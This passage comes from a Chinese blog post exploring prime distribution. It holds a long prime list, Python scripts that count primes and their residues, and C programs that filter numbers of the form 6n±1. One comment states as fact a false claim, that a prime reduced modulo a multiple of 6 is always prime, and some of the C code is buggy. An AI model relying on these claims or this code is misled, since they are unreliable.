class="number">11779</span>,<span class="number">11783</span>,<span class="number">11789</span>,<span class="number">11801</span>,<span class="number">11807</span>,<span class="number">11813</span>,<span class="number">11821</span>,<span class="number">11827</span>,<span class="number">11831</span>,<span class="number">11833</span>,</span><br><span class="line"><span class="number">11839</span>,<span class="number">11863</span>,<span class="number">11867</span>,<span class="number">11887</span>,<span class="number">11897</span>,<span class="number">11903</span>,<span class="number">11909</span>,<span class="number">11923</span>,<span class="number">11927</span>,<span class="number">11933</span>,<span class="number">11939</span>,<span class="number">11941</span>,<span class="number">11953</span>,<span class="number">11959</span>,<span class="number">11969</span>,<span class="number">11971</span>,<span class="number">11981</span>,<span class="number">11987</span>,<span class="number">12007</span>,<span class="number">12011</span>,</span><br><span class="line"><span class="number">12037</span>,<span class="number">12041</span>,<span class="number">12043</span>,<span class="number">12049</span>,<span class="number">12071</span>,<span class="number">12073</span>,<span class="number">12097</span>,<span class="number">12101</span>,<span class="number">12107</span>,<span class="number">12109</span>,<span class="number">12113</span>,<span class="number">12119</span>,<span class="number">12143</span>,<span class="number">12149</span>,<span class="number">12157</span>,<span class="number">12161</span>,<span class="number">12163</span>,<span class="number">12197</span>,<span class="number">12203</span>,<span class="number">12211</span>,</span><br><span class="line"><span class="number">12227</span>,<span class="number">12239</span>,<span class="number">12241</span>,<span class="number">12251</span>,<span class="number">12253</span>,<span class="number">12263</span>,<span class="number">12269</span>,<span class="number">12277</span>,<span class="number">12281</span>,<span class="number">12289</span>,<span class="number">12301</span>,<span class="number">12323</span>,<span class="number">12329</span>,<span class="number">12343</span>,<span class="number">12347</span>,<span class="number">12373</span>,<span class="number">12377</span>,<span class="number">12379</span>,<span class="number">12391</span>,<span class="number">12401</span>,</span><br><span class="line"><span class="number">12409</span>,<span class="number">12413</span>,<span class="number">12421</span>,<span class="number">12433</span>,<span class="number">12437</span>,<span class="number">12451</span>,<span class="number">12457</span>,<span class="number">12473</span>,<span class="number">12479</span>,<span class="number">12487</span>,<span class="number">12491</span>,<span class="number">12497</span>,<span class="number">12503</span>,<span class="number">12511</span>,<span class="number">12517</span>,<span class="number">12527</span>,<span class="number">12539</span>,<span class="number">12541</span>,<span class="number">12547</span>,<span class="number">12553</span>,</span><br><span class="line"><span class="number">12569</span>,<span class="number">12577</span>,<span class="number">12583</span>,<span class="number">12589</span>,<span class="number">12601</span>,<span class="number">12611</span>,<span class="number">12613</span>,<span class="number">12619</span>,<span class="number">12637</span>,<span class="number">12641</span>,<span class="number">12647</span>,<span class="number">12653</span>,<span class="number">12659</span>,<span class="number">12671</span>,<span class="number">12689</span>,<span class="number">12697</span>,<span class="number">12703</span>,<span class="number">12713</span>,<span class="number">12721</span>,<span class="number">12739</span>,</span><br><span class="line"><span class="number">12743</span>,<span class="number">12757</span>,<span class="number">12763</span>,<span class="number">12781</span>,<span class="number">12791</span>,<span class="number">12799</span>,<span class="number">12809</span>,<span class="number">12821</span>,<span class="number">12823</span>,<span class="number">12829</span>,<span class="number">12841</span>,<span class="number">12853</span>,<span class="number">12889</span>,<span class="number">12893</span>,<span class="number">12899</span>,<span class="number">12907</span>,<span class="number">12911</span>,<span class="number">12917</span>,<span class="number">12919</span>,<span class="number">12923</span>,</span><br><span class="line"><span class="number">12941</span>,<span class="number">12953</span>,<span class="number">12959</span>,<span class="number">12967</span>,<span class="number">12973</span>,<span class="number">12979</span>,<span class="number">12983</span>,<span class="number">13001</span>,<span class="number">13003</span>,<span class="number">13007</span>,<span class="number">13009</span>,<span class="number">13033</span>,<span class="number">13037</span>,<span class="number">13043</span>,<span class="number">13049</span>,<span class="number">13063</span>,<span class="number">13093</span>,<span class="number">13099</span>,<span class="number">13103</span>,<span class="number">13109</span>,</span><br><span class="line"><span class="number">13121</span>,<span class="number">13127</span>,<span class="number">13147</span>,<span class="number">13151</span>,<span class="number">13159</span>,<span class="number">13163</span>,<span class="number">13171</span>,<span class="number">13177</span>,<span class="number">13183</span>,<span class="number">13187</span>,<span class="number">13217</span>,<span class="number">13219</span>,<span class="number">13229</span>,<span class="number">13241</span>,<span class="number">13249</span>,<span class="number">13259</span>,<span class="number">13267</span>,<span class="number">13291</span>,<span class="number">13297</span>,<span class="number">13309</span>,</span><br><span class="line"><span class="number">13313</span>,<span class="number">13327</span>,<span class="number">13331</span>,<span class="number">13337</span>,<span class="number">13339</span>,<span class="number">13367</span>,<span class="number">13381</span>,<span class="number">13397</span>,<span class="number">13399</span>,<span class="number">13411</span>,<span class="number">13417</span>,<span class="number">13421</span>,<span class="number">13441</span>,<span class="number">13451</span>,<span class="number">13457</span>,<span class="number">13463</span>,<span class="number">13469</span>,<span class="number">13477</span>,<span class="number">13487</span>,<span class="number">13499</span>,</span><br><span class="line"><span class="number">13513</span>,<span class="number">13523</span>,<span class="number">13537</span>,<span class="number">13553</span>,<span class="number">13567</span>,<span class="number">13577</span>,<span class="number">13591</span>,<span class="number">13597</span>,<span class="number">13613</span>,<span class="number">13619</span>,<span class="number">13627</span>,<span class="number">13633</span>,<span class="number">13649</span>,<span class="number">13669</span>,<span class="number">13679</span>,<span class="number">13681</span>,<span class="number">13687</span>,<span class="number">13691</span>,<span class="number">13693</span>,<span class="number">13697</span>,</span><br><span class="line"><span class="number">13709</span>,<span class="number">13711</span>,<span class="number">13721</span>,<span class="number">13723</span>,<span class="number">13729</span>,<span class="number">13751</span>,<span class="number">13757</span>,<span class="number">13759</span>,<span class="number">13763</span>,<span class="number">13781</span>,<span class="number">13789</span>,<span class="number">13799</span>,<span class="number">13807</span>,<span class="number">13829</span>,<span class="number">13831</span>,<span class="number">13841</span>,<span class="number">13859</span>,<span class="number">13873</span>,<span class="number">13877</span>,<span class="number">13879</span>,</span><br><span class="line"><span class="number">13883</span>,<span class="number">13901</span>,<span class="number">13903</span>,<span class="number">13907</span>,<span class="number">13913</span>,<span class="number">13921</span>,<span class="number">13931</span>,<span class="number">13933</span>,<span class="number">13963</span>,<span class="number">13967</span>,<span class="number">13997</span>,<span class="number">13999</span>,<span class="number">14009</span>,<span class="number">14011</span>,<span class="number">14029</span>,<span class="number">14033</span>,<span class="number">14051</span>,<span class="number">14057</span>,<span class="number">14071</span>,<span class="number">14081</span>,</span><br><span class="line"><span class="number">14083</span>,<span class="number">14087</span>,<span class="number">14107</span>,<span class="number">14143</span>,<span class="number">14149</span>,<span class="number">14153</span>,<span class="number">14159</span>,<span class="number">14173</span>,<span class="number">14177</span>,<span class="number">14197</span>,<span class="number">14207</span>,<span class="number">14221</span>,<span class="number">14243</span>,<span class="number">14249</span>,<span class="number">14251</span>,<span class="number">14281</span>,<span class="number">14293</span>,<span class="number">14303</span>,<span class="number">14321</span>,<span class="number">14323</span>,</span><br><span class="line"><span class="number">14327</span>,<span class="number">14341</span>,<span class="number">14347</span>,<span class="number">14369</span>,<span class="number">14387</span>,<span class="number">14389</span>,<span class="number">14401</span>,<span class="number">14407</span>,<span class="number">14411</span>,<span class="number">14419</span>,<span class="number">14423</span>,<span class="number">14431</span>,<span class="number">14437</span>,<span class="number">14447</span>,<span class="number">14449</span>,<span class="number">14461</span>,<span class="number">14479</span>,<span class="number">14489</span>,<span class="number">14503</span>,<span class="number">14519</span>,</span><br><span class="line"><span class="number">14533</span>,<span class="number">14537</span>,<span class="number">14543</span>,<span class="number">14549</span>,<span class="number">14551</span>,<span class="number">14557</span>,<span class="number">14561</span>,<span class="number">14563</span>,<span class="number">14591</span>,<span class="number">14593</span>,<span class="number">14621</span>,<span class="number">14627</span>,<span class="number">14629</span>,<span class="number">14633</span>,<span class="number">14639</span>,<span class="number">14653</span>,<span class="number">14657</span>,<span class="number">14669</span>,<span class="number">14683</span>,<span class="number">14699</span>,</span><br><span class="line"><span class="number">14713</span>,<span class="number">14717</span>,<span class="number">14723</span>,<span class="number">14731</span>,<span class="number">14737</span>,<span class="number">14741</span>,<span class="number">14747</span>,<span class="number">14753</span>,<span class="number">14759</span>,<span class="number">14767</span>,<span class="number">14771</span>,<span class="number">14779</span>,<span class="number">14783</span>,<span class="number">14797</span>,<span class="number">14813</span>,<span class="number">14821</span>,<span class="number">14827</span>,<span class="number">14831</span>,<span class="number">14843</span>,<span class="number">14851</span>,</span><br><span class="line"><span class="number">14867</span>,<span class="number">14869</span>,<span class="number">14879</span>,<span class="number">14887</span>,<span class="number">14891</span>,<span class="number">14897</span>,<span class="number">14923</span>,<span class="number">14929</span>,<span class="number">14939</span>,<span class="number">14947</span>,<span class="number">14951</span>,<span class="number">14957</span>,<span class="number">14969</span>,<span class="number">14983</span>,<span class="number">15013</span>,<span class="number">15017</span>,<span class="number">15031</span>,<span class="number">15053</span>,<span class="number">15061</span>,<span class="number">15073</span>,</span><br><span class="line"><span class="number">15077</span>,<span class="number">15083</span>,<span class="number">15091</span>,<span class="number">15101</span>,<span class="number">15107</span>,<span class="number">15121</span>,<span class="number">15131</span>,<span class="number">15137</span>,<span class="number">15139</span>,<span class="number">15149</span>,<span class="number">15161</span>,<span class="number">15173</span>,<span class="number">15187</span>,<span class="number">15193</span>,<span class="number">15199</span>,<span class="number">15217</span>,<span class="number">15227</span>,<span class="number">15233</span>,<span class="number">15241</span>,<span class="number">15259</span>,</span><br><span class="line"><span class="number">15263</span>,<span class="number">15269</span>,<span class="number">15271</span>,<span class="number">15277</span>,<span class="number">15287</span>,<span class="number">15289</span>,<span class="number">15299</span>,<span class="number">15307</span>,<span class="number">15313</span>,<span class="number">15319</span>,<span class="number">15329</span>,<span class="number">15331</span>,<span class="number">15349</span>,<span class="number">15359</span>,<span class="number">15361</span>,<span class="number">15373</span>,<span class="number">15377</span>,<span class="number">15383</span>,<span class="number">15391</span>,<span class="number">15401</span>,</span><br><span class="line"><span class="number">15413</span>,<span class="number">15427</span>,<span class="number">15439</span>,<span class="number">15443</span>,<span class="number">15451</span>,<span class="number">15461</span>,<span class="number">15467</span>,<span class="number">15473</span>,<span class="number">15493</span>,<span class="number">15497</span>,<span class="number">15511</span>,<span class="number">15527</span>,<span class="number">15541</span>,<span class="number">15551</span>,<span class="number">15559</span>,<span class="number">15569</span>,<span class="number">15581</span>,<span class="number">15583</span>,<span class="number">15601</span>,<span class="number">15607</span>,</span><br><span class="line"><span class="number">15619</span>,<span class="number">15629</span>,<span class="number">15641</span>,<span class="number">15643</span>,<span class="number">15647</span>,<span class="number">15649</span>,<span class="number">15661</span>,<span class="number">15667</span>,<span class="number">15671</span>,<span class="number">15679</span>,<span class="number">15683</span>,<span class="number">15727</span>,<span class="number">15731</span>,<span class="number">15733</span>,<span class="number">15737</span>,<span class="number">15739</span>,<span class="number">15749</span>,<span class="number">15761</span>,<span class="number">15767</span>,<span class="number">15773</span>,</span><br><span class="line"><span class="number">15787</span>,<span class="number">15791</span>,<span class="number">15797</span>,<span class="number">15803</span>,<span class="number">15809</span>,<span class="number">15817</span>,<span class="number">15823</span>,<span class="number">15859</span>,<span class="number">15877</span>,<span class="number">15881</span>,<span class="number">15887</span>,<span class="number">15889</span>,<span class="number">15901</span>,<span class="number">15907</span>,<span class="number">15913</span>,<span class="number">15919</span>,<span class="number">15923</span>,<span class="number">15937</span>,<span class="number">15959</span>,<span class="number">15971</span>,</span><br><span class="line"><span class="number">15973</span>,<span class="number">15991</span>,<span class="number">16001</span>,<span class="number">16007</span>,<span class="number">16033</span>,<span class="number">16057</span>,<span class="number">16061</span>,<span class="number">16063</span>,<span class="number">16067</span>,<span class="number">16069</span>,<span class="number">16073</span>,<span class="number">16087</span>,<span class="number">16091</span>,<span class="number">16097</span>,<span class="number">16103</span>,<span class="number">16111</span>,<span class="number">16127</span>,<span class="number">16139</span>,<span class="number">16141</span>,<span class="number">16183</span>,</span><br><span class="line"><span class="number">16187</span>,<span class="number">16189</span>,<span class="number">16193</span>,<span class="number">16217</span>,<span class="number">16223</span>,<span class="number">16229</span>,<span class="number">16231</span>,<span class="number">16249</span>,<span class="number">16253</span>,<span class="number">16267</span>,<span class="number">16273</span>,<span class="number">16301</span>,<span class="number">16319</span>,<span class="number">16333</span>,<span class="number">16339</span>,<span class="number">16349</span>,<span class="number">16361</span>,<span class="number">16363</span>,<span class="number">16369</span>,<span class="number">16381</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(shuzu))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">14</span>):</span><br><span class="line">    n=<span class="number">0</span></span><br><span class="line">    m=<span class="built_in">pow</span>(<span class="number">2</span>,i-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> shuzu:</span><br><span class="line">        <span class="keyword">if</span>(j &lt; m):<span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(j &gt;= m <span class="keyword">and</span> j &lt; <span class="built_in">pow</span>(<span class="number">2</span>,i)):</span><br><span class="line">            <span class="comment">#print(j)</span></span><br><span class="line">            n+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(j&gt;=<span class="built_in">pow</span>(<span class="number">2</span>,i)):<span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2 ^&quot;</span>,i-<span class="number">1</span>,<span class="string">&quot; ~ &quot;</span>,<span class="string">&quot;2 ^&quot;</span>,i,<span class="string">&quot; 有&quot;</span>,n,<span class="string">&quot; 个质数&quot;</span>)</span><br></pre></td></tr></table></figure><p>一些发现：随着正整数数量的指数倍生长，质数的数量其实也类似于指数倍生长</p><h3 id="2、查看模n后，质数余数的分布："><a href="#2、查看模n后，质数余数的分布：" class="headerlink" title="2、查看模n后，质数余数的分布："></a>2、查看模n后，质数余数的分布：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">shuzu = [<span class="comment">#数组同上，太多了，这里删除了，数组可由代码生成到txt再粘贴进来]</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入模数:&quot;</span>))</span><br><span class="line"><span class="comment">#print(&quot;c=&quot;,c)</span></span><br><span class="line">b = [[i,<span class="number">0</span>]<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,c+<span class="number">1</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> shuzu:</span><br><span class="line">    a = i%c</span><br><span class="line">    b[a][<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,c+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span>(b[i][<span class="number">1</span>]!=<span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(b[i])</span><br></pre></td></tr></table></figure><p>一些发现：</p><p><img src="image-20230304043307987.png" alt="image-20230304043307987"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#质数与数字6之间似乎有某种不可告人的秘密，一个质数模6的倍数得到的数一定是质数，1除外</span></span><br></pre></td></tr></table></figure><br/><p>得到的启发：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#我们是不是可以定义一个集合 arr = [2、3、6n-1、6n+1] ，由上面的推导可知所有质数都在此集合中</span></span><br><span class="line"><span class="comment">#那么我们是否能找到一种方式，准确而又简便地剔除掉 arr 中的非质数元素 ?</span></span><br><span class="line"><span class="comment">#该怎么剔除呢 ?</span></span><br></pre></td></tr></table></figure><p>初步尝试：输出 [2,3,6n-1,6n+1]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b,c,num,i,j,k;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入想要查找的质数范围的最大数值(例:16384)：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">    a = num/<span class="number">3</span>+<span class="number">4</span>;           <span class="comment">//加入2、3以及多一组6n-1、6n+1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//--/linux gcc编译器不支持以下写法，本代码是在windows上运行的/--//</span></span><br><span class="line">    <span class="keyword">int</span> arr[a+<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;   <span class="comment">//数组稍微开大，防止溢出</span></span><br><span class="line">    </span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">    arr[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=a;<span class="number">1</span>)&#123;</span><br><span class="line">        b = <span class="number">6</span>*(i<span class="number">-1</span>)<span class="number">-1</span>;</span><br><span class="line">        c = b+<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(b%<span class="number">6</span>==<span class="number">1</span> || b%<span class="number">6</span>==<span class="number">5</span>)&#123;</span><br><span class="line">            arr[i] = b;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(c%<span class="number">6</span>==<span class="number">1</span> || c%<span class="number">6</span>==<span class="number">5</span>)&#123;</span><br><span class="line">            arr[i] = c;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=a;i++)&#123;</span><br><span class="line">        k++;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,arr[i]);</span><br><span class="line">        <span class="keyword">if</span>(k%<span class="number">15</span>==<span class="number">0</span>)<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0~%d 中有 %d 个 [2,3,6n-1,6n+1] 数组数&quot;</span>,num,k);</span><br><span class="line">    <span class="comment">//--/结果：0~16384 中有 5466 个 [2,3,6n-1,6n+1] 数组数/--//</span></span><br><span class="line">    <span class="comment">//--/0~16384中有1900个素数，还得通过筛选尽量使5466变成1900/--//</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20230304114024665.png" alt="image-20230304114024665"></p><p>第二次尝试：筛选 [2,3,6n-1,6n+1]，用于筛选的数可由上面的python代码进行查找</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b,c,num,i,j,k;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入想要查找的质数范围的最大数值(例:16384)：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">    a = num/<span class="number">3</span>+<span class="number">4</span>;           <span class="comment">//加入2、3以及多一组6n-1、6n+1 </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//--/linux gcc编译器不支持以下写法，本代码是在windows上运行的/--//</span></span><br><span class="line">    <span class="keyword">int</span> arr[a+<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;    <span class="comment">//数组稍微开大，防止溢出</span></span><br><span class="line">    </span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">    arr[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=a &amp;&amp; b&lt;=num;i++)&#123;</span><br><span class="line">        b = <span class="number">6</span>*(i<span class="number">-1</span>)<span class="number">-1</span>;</span><br><span class="line">        c = b+<span class="number">2</span>;</span><br><span class="line">        <span class="comment">//--/除2、3外，素数模10，末尾必是1、3、7、9/--//</span></span><br><span class="line">        <span class="keyword">if</span>(b%<span class="number">10</span>==<span class="number">1</span> || b%<span class="number">10</span>==<span class="number">3</span> || b%<span class="number">10</span>==<span class="number">7</span> || b%<span class="number">10</span>==<span class="number">9</span>)&#123;    </span><br><span class="line">            arr[x] = b;</span><br><span class="line">            x++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(c%<span class="number">10</span>==<span class="number">1</span> || c%<span class="number">10</span>==<span class="number">3</span> || c%<span class="number">10</span>==<span class="number">7</span> || c%<span class="number">10</span>==<span class="number">9</span>)&#123;</span><br><span class="line">            arr[x] = c;</span><br><span class="line">            x++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=a &amp;&amp; arr[i]!=<span class="number">0</span>;i++)&#123;</span><br><span class="line">        k++;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,arr[i]);</span><br><span class="line">        <span class="keyword">if</span>(k%<span class="number">15</span>==<span class="number">0</span>)<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0~%d 中有 %d 个 [2,3,6n-1,6n+1] 数组数&quot;</span>,num,k);</span><br><span class="line">    <span class="comment">//--/结果：0~16384 中有 4371(得-1) 个 [2,3,6n-1,6n+1] 数/--//</span></span><br><span class="line">    <span class="comment">//--/0~16384中有1900个素数，还得通过筛选尽量使4371变成1900/--//</span></span><br><span class="line">    <span class="comment">//--/根据数字的生成性(个人看法)，继续筛下去没有意义/--//</span></span><br><span class="line">    <span class="comment">//--/在找出域中所有质数之前筛选只能无限接近但不能等于/--//</span></span><br><span class="line">    <span class="comment">//--/能找出来域中所有质数，筛选也就没有意义了/--//</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>收获：这条路或许行不通，还是得从别的角度探索质数的生长规律。</p><p>第三次尝试：加筛选条件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b,c,num,i,j,k;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入想要查找的质数范围的最大数值(例:16384)：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">    a = num/<span class="number">3</span>+<span class="number">4</span>;           <span class="comment">//加入2、3以及多一组6n-1、6n+1 </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//--/linux gcc编译器不支持以下写法，本代码是在windows上运行的/--//</span></span><br><span class="line">    <span class="keyword">int</span> arr[a+<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;    <span class="comment">//数组稍微开大，防止溢出</span></span><br><span class="line">    </span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">    arr[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">2</span>; </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=a &amp;&amp; b&lt;=num;i++)&#123;</span><br><span class="line">        b = <span class="number">6</span>*(i<span class="number">-1</span>)<span class="number">-1</span>;</span><br><span class="line">        c = b+<span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">//--/除2、3外，素数模10，末尾必是1、3、7、9/--//</span></span><br><span class="line">        <span class="keyword">if</span>(b%<span class="number">10</span>==<span class="number">1</span> || b%<span class="number">10</span>==<span class="number">3</span> || b%<span class="number">10</span>==<span class="number">7</span> || b%<span class="number">10</span>==<span class="number">9</span>)&#123;    </span><br><span class="line">            <span class="keyword">if</span>(b%<span class="number">20</span>==<span class="number">1</span>||b%<span class="number">20</span>==<span class="number">3</span>||b%<span class="number">20</span>==<span class="number">7</span>||b%<span class="number">20</span>==<span class="number">9</span>||b%<span class="number">20</span>==<span class="number">11</span>||b%<span class="number">20</span>==<span class="number">13</span>||b%<span class="number">20</span>==<span class="number">17</span>||b%<span class="number">20</span>==<span class="number">19</span>)&#123;</span><br><span class="line">                arr[x] = b;</span><br><span class="line">                x++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(c%<span class="number">10</span>==<span class="number">1</span> || c%<span class="number">10</span>==<span class="number">3</span> || c%<span class="number">10</span>==<span class="number">7</span> || c%<span class="number">10</span>==<span class="number">9</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c%<span class="number">20</span>==<span class="number">1</span>||c%<span class="number">20</span>==<span class="number">3</span>||c%<span class="number">20</span>==<span class="number">7</span>||c%<span class="number">20</span>==<span class="number">9</span>||c%<span class="number">20</span>==<span class="number">11</span>||c%<span class="number">20</span>==<span class="number">13</span>||c%<span class="number">20</span>==<span class="number">17</span>||c%<span class="number">20</span>==<span class="number">19</span>)&#123;</span><br><span class="line">                arr[x] = c;</span><br><span class="line">                x++;</span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=a 